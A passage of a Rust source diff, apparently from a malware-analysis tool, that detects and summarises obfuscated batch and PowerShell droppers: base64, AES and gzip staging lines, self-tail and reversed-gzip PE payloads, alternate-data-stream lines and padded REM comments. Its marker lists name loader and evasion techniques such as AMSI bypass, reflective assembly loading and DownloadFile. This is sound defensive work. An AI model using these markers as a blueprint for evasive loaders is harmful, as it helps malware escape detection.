+    has_scriptable_extension
+        && (lower.contains(" -c ")
+            || lower.contains(" -command ")
+            || lower.contains(" /c ")
+            || lower.contains(" /command "))
+}
+
+fn first_command_token(lower: &str) -> Option<&str> {
+    first_command_token_and_rest(lower).map(|(token, _)| token)
+}
+
+fn first_command_token_and_rest(lower: &str) -> Option<(&str, &str)> {
+    let trimmed = lower.trim_start();
+    if let Some(rest) = trimmed.strip_prefix('"') {
+        let end = rest.find('"')?;
+        let token = &rest[..end];
+        let after = &rest[end + 1..];
+        return Some((token, after));
+    }
+    let end = trimmed
+        .find(|c: char| c.is_whitespace() || matches!(c, '|' | '&' | '<' | '>'))
+        .unwrap_or(trimmed.len());
+    (end > 0).then(|| (&trimmed[..end], &trimmed[end..]))
+}
+
+fn has_powershell_loader_markers(lower: &str) -> bool {
+    let mut score = 0;
+    for marker in [
+        "system.security.cryptography",
+        "createdecryptor",
+        "transformfinalblock",
+        "gzipstream",
+        "reflection.assembly",
+        "frombase64string",
+        "amsiscanbuffer",
+    ] {
+        if lower.contains(marker) {
+            score += 1;
+        }
+    }
+    score >= 3
+}
+
+fn is_split_dynamic_function_provider(lower: &str) -> bool {
+    (lower.contains("='func'") || lower.contains("=\"func\""))
+        && (lower.contains("+='t'") || lower.contains("+=\"t\""))
+        && (lower.contains("+='i'") || lower.contains("+=\"i\""))
+        && (lower.contains("+='on:'") || lower.contains("+=\"on:\""))
+        && lower.contains("ni -p")
+        && lower.contains("-value")
+}
+
+fn summarize_long_powershell_staging_set_lines(text: &str, env: &mut Environment) -> String {
+    let mut omitted = 0usize;
+    let mut omitted_bytes = 0usize;
+    for line in text.split_inclusive('\n') {
+        let (body, _ending) = split_line_ending(line);
+        if is_long_powershell_staging_set_line(body) {
+            omitted += 1;
+            omitted_bytes += body.len();
+        }
+    }
+    if omitted == 0 {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut inserted_summary = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_long_powershell_staging_set_line(body) {
+            if !inserted_summary {
+                env.traits.push(crate::traits::Trait::LineTruncated {
+                    original_len: omitted_bytes as u64,
+                });
+                if omitted == 1 {
+                    out.push_str(&format!(
+                        "rem omitted long PowerShell staging set line ({omitted_bytes} bytes){}",
+                        ending
+                    ));
+                } else {
+                    out.push_str(&format!(
+                        "rem omitted {omitted} long PowerShell staging set lines ({omitted_bytes} bytes){}",
+                        ending
+                    ));
+                }
+                inserted_summary = true;
+            }
+        } else {
+            out.push_str(line);
+        }
+    }
+    out
+}
+
+fn is_long_powershell_staging_set_line(line: &str) -> bool {
+    if line.len() < 256 {
+        return false;
+    }
+    let trimmed = line.trim_start();
+    let lower = trimmed.to_ascii_lowercase();
+    if !(lower.starts_with("set \"")
+        || lower.starts_with("set ")
+        || lower.starts_with("call set \"")
+        || lower.starts_with("call set "))
+    {
+        return false;
+    }
+    let has_literal_powershell = lower.contains("powershell");
+    let detection_lower = if has_literal_powershell {
+        lower
+    } else {
+        repeated_uppercase_marker_stripped_lower(trimmed).unwrap_or(lower)
+    };
+    let compact_lower = powershell_placeholder_compacted_lower(&detection_lower);
+    let mut score = 0;
+    for marker in [
+        "frombase64string",
+        "system.security.cryptography.aes",
+        "gzipstream",
+        "reflection.assembly",
+        "createdecryptor",
+        "transformfinalblock",
+    ] {
+        if detection_lower.contains(marker) || compact_lower.contains(marker) {
+            score += 1;
+        }
+    }
+
+    let mut markerless_score = 0;
+    for marker in [
+        "$erroractionpreference",
+        ".dll",
+        "activator",
+        "bindingflags",
+        "codeanalysis",
+        "codepages.dll",
+        "copyto",
+        "createinstance",
+        "executioncontext",
+        "getawaiter",
+        "getentry",
+        "getmethods",
+        "getparameters",
+        "getresult",
+        "gettype",
+        "getmethod",
+        "languagemode",
+        "microsoft.codeanalysis",
+        "nupkg",
+        "psversiontable",
+        "scriptblock",
+        "sessionstate",
+        "system.collections.immutable",
+        "system.text.encoding",
+        "threading.thread",
+        "toarray",
+        "[type]",
+        "[type[]]",
+        "system.net.http",
+        "httpclient",
+        "reflection.assembly",
+    ] {
+        if detection_lower.contains(marker) || compact_lower.contains(marker) {
+            markerless_score += 1;
+        }
+    }
+    if has_literal_powershell
+        || detection_lower.contains("powershell")
+        || compact_lower.contains("powershell")
+    {
+        return score >= 2 || markerless_score >= 3;
+    }
+    markerless_score >= 3
+}
+
+fn powershell_placeholder_compacted_lower(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut chars = text.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch == '#'
+            && chars
+                .peek()
+                .is_some_and(|next| next.is_ascii_alphanumeric() || *next == '_')
+        {
+            chars.next();
+            continue;
+        }
+        out.push(ch);
+    }
+    out
+}
+
+fn repeated_uppercase_marker_stripped_lower(text: &str) -> Option<String> {
+    let mut counts = std::collections::HashMap::<String, usize>::new();
+    let mut current = String::new();
+
+    for ch in text.chars().chain(std::iter::once(' ')) {
+        if ch.is_ascii_uppercase() {
+            current.push(ch);
+            continue;
+        }
+        if current.len() >= 3 {
+            for width in 3..=8.min(current.len()) {
+                for start in 0..=current.len() - width {
+                    let marker = &current[start..start + width];
+                    let distinct = marker
+                        .bytes()
+                        .collect::<std::collections::HashSet<_>>()
+                        .len();
+                    if distinct < 3 {
+                        continue;
+                    }
+                    *counts.entry(marker.to_string()).or_insert(0) += 1;
+                }
+            }
+        }
+        current.clear();
+    }
+
+    let (marker, count) = counts
+        .into_iter()
+        .max_by_key(|(marker, count)| (*count, marker.len()))?;
+    if count < 8 {
+        return None;
+    }
+    Some(text.replace(&marker, "").to_ascii_lowercase())
+}
+
+fn summarize_long_attrib_ads_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if let Some(target) = long_attrib_ads_target(body) {
+            changed = true;
+            rescue_truncated_urls(body, body.len(), env);
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: body.len() as u64,
+            });
+            out.push_str(&format!(
+                "rem omitted long attrib alternate-data-stream line ({} bytes; target: {}){}",
+                body.len(),
+                target,
+                ending
+            ));
+        } else {
+            out.push_str(line);
+        }
+    }
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn long_attrib_ads_target(line: &str) -> Option<String> {
+    if line.len() < 2048 {
+        return None;
+    }
+    let lower = line.to_ascii_lowercase();
+    if !lower.contains("attrib") {
+        return None;
+    }
+    let ads_pos = line.find("::")?;
+    let suffix = &line[ads_pos + 2..];
+    if suffix.len() < 1024 || !looks_like_encoded_ads_suffix(suffix) {
+        return None;
+    }
+
+    let before = line[..ads_pos].trim_end_matches(|ch: char| ch == '"' || ch.is_whitespace());
+    let target_start = before
+        .rfind(|ch: char| ch.is_whitespace() || ch == '"' || ch == '\'')
+        .map(|idx| idx + 1)
+        .unwrap_or(0);
+    let target = before[target_start..].trim_matches('"');
+    if target.is_empty() {
+        None
+    } else {
+        Some(snippet_prefix(target, 160))
+    }
+}
+
+fn looks_like_encoded_ads_suffix(suffix: &str) -> bool {
+    let sample = suffix
+        .chars()
+        .take_while(|ch| !ch.is_whitespace() && *ch != '"' && *ch != '\'')
+        .take(4096)
+        .collect::<String>();
+    if sample.len() < 1024 {
+        return false;
+    }
+    let encoded = sample
+        .bytes()
+        .filter(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'=' | b'-' | b'_'))
+        .count();
+    encoded * 100 / sample.len() >= 95
+}
+
+fn long_inline_powershell_summary_urls(line: &str) -> Vec<String> {
+    let mut urls = Vec::new();
+    let mut search_from = 0usize;
+    while search_from < line.len() && urls.len() < 4 {
+        let rest = &line[search_from..];
+        let Some(rel) = rest
+            .find("http://")
+            .into_iter()
+            .chain(rest.find("https://"))
+            .min()
+        else {
+            break;
+        };
+        let start = search_from + rel;
+        let mut end = start;
+        for (offset, ch) in line[start..].char_indices() {
+            if ch.is_whitespace() || matches!(ch, '"' | '\'' | ')' | '(' | ';' | ',') {
+                break;
+            }
+            end = start + offset + ch.len_utf8();
+        }
+        let candidate = &line[start..end];
+        for part in candidate.split('>') {
+            let url =
+                part.trim_matches(|c: char| matches!(c, '"' | '\'' | ')' | '(' | ';' | ',' | '.'));
+            if (url.starts_with("http://") || url.starts_with("https://"))
+                && !urls.iter().any(|existing| existing == url)
+            {
+                urls.push(url.to_string());
+                if urls.len() >= 4 {
+                    break;
+                }
+            }
+        }
+        search_from = end.saturating_add(1);
+    }
+    urls
+}
+
+fn long_inline_powershell_summary_details(line: &str) -> Vec<String> {
+    let mut details = Vec::new();
+    let mut urls = long_inline_powershell_summary_urls(line);
+    if urls.is_empty() {
+        urls = long_inline_powershell_summary_normalized_urls(line);
+    }
+    if !urls.is_empty() {
+        details.push(format!("urls: {}", urls.join(", ")));
+    } else if let Some(source) = powershell_webrequest_create_argument(line) {
+        details.push(format!("source: {}", snippet_prefix(&source, 160)));
+    }
+    if let Some(dst) = powershell_filestream_argument(line) {
+        details.push(format!("dst: {}", snippet_prefix(&dst, 160)));
+    } else if let Some((_src, dst)) = powershell_downloadfile_arguments(line) {
+        details.push(format!("dst: {}", snippet_prefix(&dst, 160)));
+    } else if let Some(dst) = powershell_outfile_argument(line) {
+        details.push(format!("dst: {}", snippet_prefix(&dst, 160)));
+    }
+    details
+}
+
+fn long_inline_powershell_summary_normalized_urls(line: &str) -> Vec<String> {
+    if line.len() > 16 * 1024 {
+        return Vec::new();
+    }
+    let mut urls = Vec::new();
+    for candidate in long_inline_powershell_normalization_candidates(line) {
+        let (normalized, timed_out) = crate::ps1_scan::normalize_ps1_text_until(&candidate, None);
+        if timed_out || normalized == candidate {
+            continue;
+        }
+        for url in long_inline_powershell_summary_urls(&normalized) {
+            if !urls.contains(&url) {
+                urls.push(url);
+            }
+        }
+    }
+    urls
+}
+
+fn long_inline_powershell_normalization_candidates(line: &str) -> Vec<String> {
+    let mut candidates = Vec::new();
+    if let Some(body) = powershell_body_candidate(line) {
+        candidates.push(body);
+    }
+    candidates.push(line.to_string());
+    candidates
+}
+
+fn powershell_body_candidate(line: &str) -> Option<String> {
+    let lower = line.to_ascii_lowercase();
+    let ps_pos = lower.find("powershell").or_else(|| lower.find("pwsh"))?;
+    let tail = &line[ps_pos..];
+    if let Some(quote_rel) = tail.find('"') {
+        let (body, _) = parse_simple_quoted_arg(tail, quote_rel)?;
+        if !body.trim().is_empty() {
+            return Some(body);
+        }
+    }
+
+    let token_end = tail
+        .find(|ch: char| ch.is_whitespace())
+        .unwrap_or(tail.len());
+    let body = tail[token_end..].trim_start();
+    if body.is_empty() || body.starts_with('-') || body.starts_with('/') {
+        return None;
+    }
+    Some(body.to_string())
+}
+
+fn powershell_webrequest_create_argument(line: &str) -> Option<String> {
+    powershell_call_first_argument(line, "[System.Net.WebRequest]::Create(")
+}
+
+fn powershell_filestream_argument(line: &str) -> Option<String> {
+    powershell_call_first_argument(line, "System.IO.FileStream(")
+}
+
+fn powershell_outfile_argument(line: &str) -> Option<String> {
+    powershell_named_argument(line, "-OutFile")
+}
+
+fn powershell_named_argument(line: &str, needle: &str) -> Option<String> {
+    let pos = crate::util::find_ascii_case_insensitive_from(line, needle, 0)?;
+    let mut idx = pos + needle.len();
+    idx = skip_ascii_ws_str(line, idx);
+    let first = line.as_bytes().get(idx).copied()?;
+    if first == b'\'' || first == b'"' {
+        return parse_simple_quoted_arg(line, idx).map(|(arg, _)| arg);
+    }
+    let end_rel = line[idx..]
+        .find(|c: char| c.is_whitespace() || matches!(c, ';' | '}' | ')' | '"' | '\''))
+        .unwrap_or(line.len() - idx);
+    let arg = line[idx..idx + end_rel].trim();
+    (!arg.is_empty()).then(|| arg.to_string())
+}
+
+fn powershell_downloadfile_arguments(line: &str) -> Option<(String, String)> {
+    let pos = crate::util::find_ascii_case_insensitive_from(line, "DownloadFile(", 0)?;
+    let mut idx = pos + "DownloadFile(".len();
+    idx = skip_ascii_ws_str(line, idx);
+    let (src, next) = parse_simple_quoted_arg(line, idx)?;
+    idx = skip_ascii_ws_str(line, next);
+    if line.as_bytes().get(idx) != Some(&b',') {
+        return None;
+    }
+    idx = skip_ascii_ws_str(line, idx + 1);
+    let (dst, _) = parse_simple_quoted_arg(line, idx)?;
+    Some((src, dst))
+}
+
+fn powershell_call_first_argument(line: &str, needle: &str) -> Option<String> {
+    let pos = crate::util::find_ascii_case_insensitive_from(line, needle, 0)?;
+    let arg_start = pos + needle.len();
+    let rest = line.get(arg_start..)?.trim_start();
+    let leading_ws = line.get(arg_start..)?.len().saturating_sub(rest.len());
+    let arg_abs = arg_start + leading_ws;
+    let first = rest.as_bytes().first().copied()?;
+    if first == b'\'' || first == b'"' {
+        return parse_simple_quoted_arg(line, arg_abs).map(|(arg, _)| arg);
+    }
+
+    let end_rel = rest.find([')', ',', ';', '\r', '\n']).unwrap_or(rest.len());
+    let arg = rest[..end_rel].trim();
+    (!arg.is_empty()).then(|| arg.to_string())
+}
+
+const MIN_REPEAT_LINES_FOR_OUTPUT_COALESCE: usize = 8;
+const MIN_REPEATED_OUTPUT_LINE_LEN: usize = 32;
+
+fn flush_short_set_fragment_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_lines >= 8 {
+        rescue_truncated_urls(pending, pending.len(), env);
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_lines = 0;
+}
+
+fn is_short_set_fragment_carrier_line(line: &str) -> bool {
+    let Some((name, value)) = set_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    !value.is_empty()
+        && value.len() <= 4
+        && !value.contains("://")
+        && value.chars().all(|c| c.is_ascii_graphic() || c == ' ')
+        && name.len() >= 4
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
 }
 
 fn is_encoded_set_carrier_line(line: &str) -> bool {
@@ -10301,15 +20132,112 @@ fn is_encoded_set_carrier_line(line: &str) -> bool {
     marker > 0 && total >= 256 && encoded * 100 >= total * 85 && other * 100 <= total * 5
 }
 
+fn is_long_base64_set_carrier_line(line: &str) -> bool {
+    let Some((_name, value)) = set_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    if value.len() < 1024 || value.contains("://") {
+        return false;
+    }
+    let encoded = value.bytes().filter(|b| is_base64_carrier_byte(*b)).count();
+    encoded * 100 >= value.len() * 98
+}
+
+fn is_chunked_encoded_set_fragment_line(line: &str) -> bool {
+    let Some((name, value)) = set_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    if !(24..=512).contains(&value.len())
+        || value.contains("://")
+        || value.contains(['%', '!', '<', '>', '|', '&', '"', '\\'])
+        || name.len() < 5
+        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+    {
+        return false;
+    }
+
+    let encoded = value
+        .bytes()
+        .filter(|b| is_base64_carrier_byte(*b) || matches!(*b, b'-' | b'_'))
+        .count();
+    encoded * 100 >= value.len() * 95
+}
+
+fn suppress_recovered_dropper_set_carrier_lines(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    let markers: Vec<String> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::MultiStageEncryptedDropper { marker, .. } if !marker.is_empty() => {
+                Some(marker.clone())
+            }
+            _ => None,
+        })
+        .collect();
+    if markers.is_empty() {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    let mut omitted_bytes = 0usize;
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_encoded_set_carrier_line(body)
+            || is_long_base64_set_carrier_line(body)
+            || is_chunked_encoded_set_fragment_line(body)
+            || is_marker_laced_set_carrier_line(body, &markers)
+        {
+            rescue_truncated_urls(line, line.len(), env);
+            omitted_bytes = omitted_bytes.saturating_add(line.len());
+            changed = true;
+            continue;
+        }
+        out.push_str(line);
+    }
+
+    if changed {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
+        Some(out)
+    } else {
+        None
+    }
+}
+
+fn is_marker_laced_set_carrier_line(line: &str, markers: &[String]) -> bool {
+    let Some((name, value)) = set_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    value.len() >= 16
+        && !value.contains("://")
+        && name.len() >= 3
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        && markers.iter().any(|marker| value.contains(marker))
+}
+
 fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> String {
     const MIN_B64_RUN: usize = 80;
     const MAX_B64_RUN: usize = 16 * 1024 * 1024;
 
-    if !looks_like_self_tail_base64_loader_text(text) {
+    let reversed_gzip_tail_loader = looks_like_self_tail_reversed_gzip_loader_text(text)
+        || extracted_ps1_has_self_tail_reversed_gzip_loader(env);
+    if !looks_like_self_tail_base64_loader_text(text) && !reversed_gzip_tail_loader {
         return text.to_string();
     }
 
-    let marker_prefixes = self_read_base64_marker_prefixes(text);
+    let marker_prefixes = if looks_like_self_tail_base64_loader_text(text) {
+        self_read_base64_marker_prefixes(text)
+    } else {
+        Vec::new()
+    };
     let mut changed = false;
     let mut out = String::with_capacity(text.len().min(256 * 1024));
     for line in text.split_inclusive('\n') {
@@ -10335,6 +20263,27 @@ fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> Str
             }
             out.push_str(line);
             continue;
+        }
+
+        if !was_capped && reversed_gzip_tail_loader {
+            if let Some(pe) = reversed_gzip_pe_from_base64(candidate) {
+                let leading_len = body.find(trimmed).unwrap_or(0);
+                out.push_str(&body[..leading_len]);
+                out.push_str(&format!(
+                    "rem omitted self-tail reversed gzip PE payload ({} bytes encoded, {} bytes recovered)",
+                    candidate.len(),
+                    pe.len()
+                ));
+                out.push_str(newline);
+                if push_recovered_pe_artifact(env, "ps1-self-tail-reversed-gzip-pe", pe.clone()) {
+                    scan_binary_input_urls(&pe, env);
+                }
+                env.traits.push(crate::traits::Trait::LineTruncated {
+                    original_len: body.len() as u64,
+                });
+                changed = true;
+                continue;
+            }
         }
 
         use base64::Engine as _;
@@ -10387,14 +20336,14 @@ fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> Str
         out.push_str(&body[..leading_len]);
         if let Some(decoded) = decoded {
             out.push_str(&format!(
-                "::==== harrington: omitted self-tail base64 payload ({} bytes encoded, {} bytes decoded) ====",
+                "rem omitted self-tail base64 payload ({} bytes encoded, {} bytes decoded)",
                 candidate.len(),
                 decoded.len()
             ));
             rescue_truncated_urls(&String::from_utf8_lossy(&decoded), body.len(), env);
         } else {
             out.push_str(&format!(
-                "::==== harrington: omitted self-tail base64 payload (at least {} bytes encoded) ====",
+                "rem omitted self-tail base64 payload (at least {} bytes encoded)",
                 candidate.len()
             ));
         }
@@ -10443,13 +20392,18 @@ fn summarize_marker_prefixed_self_read_base64_line(
     let leading_len = body.find(trimmed).unwrap_or(0);
     out.push_str(&body[..leading_len]);
     out.push_str(&format!(
-        "::==== harrington: omitted self-read base64 marker payload ({} marker bytes, {} bytes encoded, {} bytes decoded) ====",
+        "rem omitted self-read base64 marker payload ({} marker bytes, {} bytes encoded, {} bytes decoded)",
         marker.len(),
         b64.len(),
         decoded.len()
     ));
     out.push_str(newline);
     rescue_truncated_urls(&String::from_utf8_lossy(&decoded), body.len(), env);
+    if decoded.len() <= MAX_DIRECT_EXTRACTED_PS1_BYTES {
+        env.push_extracted_ps1(decoded);
+    } else {
+        crate::ps1_scan::scan_large_ps1_payload_bytes_fast(&decoded, env);
+    }
     env.traits.push(crate::traits::Trait::LineTruncated {
         original_len: body.len() as u64,
     });
@@ -10457,20 +20411,43 @@ fn summarize_marker_prefixed_self_read_base64_line(
 }
 
 fn self_read_base64_marker_prefixes(text: &str) -> Vec<String> {
-    let Ok(re) =
-        regex::Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/\=\]\+\)['"]"#)
-    else {
+    let Ok(re) = regex::Regex::new(
+        r#"(?is)-match\s*['"](?:(::)?)([^'"]{4,200}?)\(\[A-Za-z0-9\+/=(?:\{\})?\]\+\)['"]"#,
+    ) else {
         return Vec::new();
     };
     let mut markers = Vec::new();
     for caps in re.captures_iter(text) {
-        let Some(marker) = caps.get(1).map(|m| m.as_str()) else {
+        let Some(marker) = caps.get(2).map(|m| m.as_str()) else {
             continue;
         };
+        let marker = format!("{}{}", caps.get(1).map_or("", |m| m.as_str()), marker);
         if marker.bytes().all(is_base64_carrier_byte)
-            && !markers.iter().any(|existing: &String| existing == marker)
+            && !markers.iter().any(|existing: &String| existing == &marker)
         {
-            markers.push(marker.to_string());
+            markers.push(marker);
+        }
+    }
+    if markers.is_empty() {
+        let lower = text.to_ascii_lowercase();
+        for needle in ["-match '::", "-match \"::"] {
+            let mut search_from = 0usize;
+            while let Some(relative) = lower[search_from..].find(needle) {
+                let start = search_from + relative + "-match ".len() + 1;
+                let rest = &text[start..];
+                let Some(end) = rest.find("([A-Za-z0-9+/=]+)") else {
+                    search_from = start;
+                    continue;
+                };
+                let marker = &rest[..end];
+                if marker.len() >= 4
+                    && marker.starts_with("::")
+                    && marker[2..].bytes().all(is_base64_carrier_byte)
+                {
+                    markers.push(marker.to_string());
+                }
+                search_from = start.saturating_add(end.max(1));
+            }
         }
     }
     markers
@@ -10478,7 +20455,29 @@ fn self_read_base64_marker_prefixes(text: &str) -> Vec<String> {
 
 fn looks_like_self_tail_base64_loader_text(text: &str) -> bool {
     let lower = text.to_ascii_lowercase();
-    lower.contains("get-content") && lower.contains("-raw") && lower.contains("frombase64string")
+    (lower.contains("get-content") && lower.contains("-raw") && lower.contains("frombase64string"))
+        || (lower.contains("readalltext")
+            && lower.contains("-match")
+            && lower.contains("frombase64string"))
+        || looks_like_self_tail_reversed_gzip_loader_text(text)
+}
+
+fn looks_like_self_tail_reversed_gzip_loader_text(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    let self_tail_reader = (lower.contains("getcurrentprocess") && lower.contains("readlines"))
+        || (lower.contains("get-content") && lower.contains("select-object -last 1"));
+    self_tail_reader
+        && lower.contains("frombase64string")
+        && lower.contains("gzipstream")
+        && lower.contains("[array]::reverse")
+        && lower.contains("assembly]::load")
+}
+
+fn extracted_ps1_has_self_tail_reversed_gzip_loader(env: &Environment) -> bool {
+    env.all_extracted_ps1.iter().any(|bytes| {
+        let decoded = decode_likely_powershell_payload(bytes);
+        looks_like_self_tail_reversed_gzip_loader_text(&decoded)
+    })
 }
 
 fn looks_like_powershell_payload_bytes(bytes: &[u8]) -> bool {
@@ -10502,44 +20501,646 @@ fn looks_like_powershell_payload_bytes(bytes: &[u8]) -> bool {
         || lower.contains('$')
 }
 
+fn looks_like_python_payload_bytes(bytes: &[u8]) -> bool {
+    let text = String::from_utf8_lossy(bytes);
+    looks_like_python_payload_text(&text)
+}
+
+fn looks_like_python_payload_text(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    let has_python_import = lower.contains("import ")
+        || lower.contains("__import__(")
+        || lower.contains("from base64 import")
+        || lower.contains("from urllib");
+    let has_python_exec_or_decode = lower.contains("exec(")
+        || lower.contains("marshal.loads")
+        || lower.contains("zlib.decompress")
+        || lower.contains("base64.b64decode")
+        || lower.contains(".b85decode")
+        || lower.contains("requests.")
+        || lower.contains("urllib.request");
+    has_python_import && has_python_exec_or_decode
+}
+
 fn summarize_long_rem_comment_lines(text: &str, env: &mut Environment) -> String {
     const MIN_SUMMARY_BYTES: usize = 1024;
+    const MIN_HIGH_ENTROPY_SUMMARY_BYTES: usize = 384;
 
-    if !contains_rem_comment_candidate(text) {
+    if !contains_rem_comment_candidate(text) && !contains_caret_rem_comment_candidate(text) {
         return text.to_string();
     }
 
     let mut out = String::with_capacity(text.len().min(256 * 1024));
+    let mut pending = LongRemSummaryRun::default();
     for line in text.split_inclusive('\n') {
         let (body, eol) = split_line_ending(line);
         let trimmed = body.trim_start_matches(['@', ' ', '\t']);
         let leading_len = body.len() - trimmed.len();
-        let lower = trimmed.to_ascii_lowercase();
-        if !lower.starts_with("rem ") {
+        let Some(payload) = rem_comment_payload(trimmed) else {
+            flush_long_rem_summary_run(&mut out, &mut pending, env);
             out.push_str(line);
             continue;
-        }
-
-        let payload = &trimmed[4..];
-        if payload.len() < MIN_SUMMARY_BYTES {
+        };
+        let summarize = payload.len() >= MIN_SUMMARY_BYTES
+            || (payload.len() >= MIN_HIGH_ENTROPY_SUMMARY_BYTES
+                && is_high_entropy_rem_noise_payload(payload));
+        if !summarize {
+            flush_long_rem_summary_run(&mut out, &mut pending, env);
             out.push_str(line);
             continue;
         }
 
         rescue_truncated_urls(payload, body.len(), env);
-        out.push_str(&body[..leading_len]);
-        out.push_str("rem ::==== harrington: omitted ");
-        out.push_str(&payload.len().to_string());
-        out.push_str(" bytes from long REM comment line ====");
-        out.push_str(eol);
+        pending.record(&body[..leading_len], eol, payload.len(), body.len());
     }
+    flush_long_rem_summary_run(&mut out, &mut pending, env);
     out
 }
 
+#[derive(Default)]
+struct LongRemSummaryRun {
+    lines: usize,
+    payload_bytes: usize,
+    original_bytes: usize,
+    max_original_len: usize,
+    leading: String,
+    eol: String,
+}
+
+impl LongRemSummaryRun {
+    fn record(&mut self, leading: &str, eol: &str, payload_len: usize, original_len: usize) {
+        if self.lines == 0 {
+            self.leading.clear();
+            self.leading.push_str(leading);
+            self.eol.clear();
+            self.eol.push_str(eol);
+        }
+        self.lines += 1;
+        self.payload_bytes += payload_len;
+        self.original_bytes += original_len;
+        self.max_original_len = self.max_original_len.max(original_len);
+    }
+
+    fn clear(&mut self) {
+        self.lines = 0;
+        self.payload_bytes = 0;
+        self.original_bytes = 0;
+        self.max_original_len = 0;
+        self.leading.clear();
+        self.eol.clear();
+    }
+}
+
+fn flush_long_rem_summary_run(
+    out: &mut String,
+    pending: &mut LongRemSummaryRun,
+    env: &mut Environment,
+) {
+    if pending.lines == 0 {
+        return;
+    }
+
+    let original_len = if pending.lines == 1 {
+        pending.max_original_len
+    } else {
+        pending.original_bytes
+    };
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: original_len as u64,
+    });
+    out.push_str(&pending.leading);
+    out.push_str("rem omitted ");
+    if pending.lines == 1 {
+        out.push_str(&pending.payload_bytes.to_string());
+        out.push_str(" bytes from long REM comment line");
+    } else {
+        out.push_str(&pending.lines.to_string());
+        out.push_str(" long REM comment lines (");
+        out.push_str(&pending.payload_bytes.to_string());
+        out.push_str(" payload bytes)");
+    }
+    out.push_str(&pending.eol);
+    pending.clear();
+}
+
+fn coalesce_long_rem_comment_summary_lines(text: &str, env: &mut Environment) -> Option<String> {
+    let mut out = String::with_capacity(text.len().min(256 * 1024));
+    let mut pending = RenderedLongRemSummaryRun::default();
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, eol) = split_line_ending(line);
+        if let Some((leading, comment_lines, payload_len)) = rendered_long_rem_summary_line(body) {
+            pending.record(line, leading, eol, comment_lines, payload_len);
+            continue;
+        }
+
+        changed |= flush_rendered_long_rem_summary_run(&mut out, &mut pending, env);
+        out.push_str(line);
+    }
+    changed |= flush_rendered_long_rem_summary_run(&mut out, &mut pending, env);
+
+    changed.then_some(out)
+}
+
+#[derive(Default)]
+struct RenderedLongRemSummaryRun {
+    summary_lines: usize,
+    comment_lines: usize,
+    payload_bytes: usize,
+    first_line: String,
+    leading: String,
+    eol: String,
+}
+
+impl RenderedLongRemSummaryRun {
+    fn record(
+        &mut self,
+        line: &str,
+        leading: &str,
+        eol: &str,
+        comment_lines: usize,
+        payload_len: usize,
+    ) {
+        if self.summary_lines == 0 {
+            self.first_line.clear();
+            self.first_line.push_str(line);
+            self.leading.clear();
+            self.leading.push_str(leading);
+            self.eol.clear();
+            self.eol.push_str(eol);
+        }
+        self.summary_lines += 1;
+        self.comment_lines += comment_lines;
+        self.payload_bytes += payload_len;
+    }
+
+    fn clear(&mut self) {
+        self.summary_lines = 0;
+        self.comment_lines = 0;
+        self.payload_bytes = 0;
+        self.first_line.clear();
+        self.leading.clear();
+        self.eol.clear();
+    }
+}
+
+fn flush_rendered_long_rem_summary_run(
+    out: &mut String,
+    pending: &mut RenderedLongRemSummaryRun,
+    env: &mut Environment,
+) -> bool {
+    match pending.summary_lines {
+        0 => false,
+        1 => {
+            out.push_str(&pending.first_line);
+            pending.clear();
+            false
+        }
+        _ => {
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: pending.payload_bytes as u64,
+            });
+            out.push_str(&pending.leading);
+            out.push_str("rem omitted ");
+            out.push_str(&pending.comment_lines.to_string());
+            out.push_str(" long REM comment lines (");
+            out.push_str(&pending.payload_bytes.to_string());
+            out.push_str(" payload bytes)");
+            out.push_str(&pending.eol);
+            pending.clear();
+            true
+        }
+    }
+}
+
+fn rendered_long_rem_summary_line(line: &str) -> Option<(&str, usize, usize)> {
+    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
+    let leading_len = line.len() - trimmed.len();
+    let rest = trimmed.strip_prefix("rem omitted ")?;
+    if let Some(payload_len) = rest
+        .strip_suffix(" bytes from long REM comment line")
+        .and_then(|value| value.parse().ok())
+    {
+        return Some((&line[..leading_len], 1, payload_len));
+    }
+
+    let (comment_lines, rest) = rest.split_once(" long REM comment lines (")?;
+    let payload_len = rest.strip_suffix(" payload bytes)")?;
+    Some((
+        &line[..leading_len],
+        comment_lines.parse().ok()?,
+        payload_len.parse().ok()?,
+    ))
+}
+
